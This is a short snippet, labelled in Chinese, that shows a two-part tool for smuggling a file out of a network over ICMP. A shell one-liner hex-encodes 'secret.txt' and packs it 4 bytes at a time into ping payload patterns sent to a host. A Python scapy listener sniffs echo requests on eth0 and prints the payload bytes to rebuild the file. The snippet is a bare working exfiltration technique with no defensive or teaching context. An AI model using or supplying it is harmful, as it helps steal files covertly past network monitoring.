PING 发送端:

xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done  
 

接收端ping_receiver.py:

```python
import sys  
  
try:  
    from scapy.all import *  
except:  
    print("Scapy not found, please install scapy: pip install scapy")  
    sys.exit(0)  
  
  
def process_packet(pkt):  
    if pkt.haslayer(ICMP):  
        if pkt[ICMP].type == 8:  
            data = pkt[ICMP].load[-4:]  
            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")  
  
sniff(iface="eth0", prn=process_packet)  
python3 ping_receiver.py
```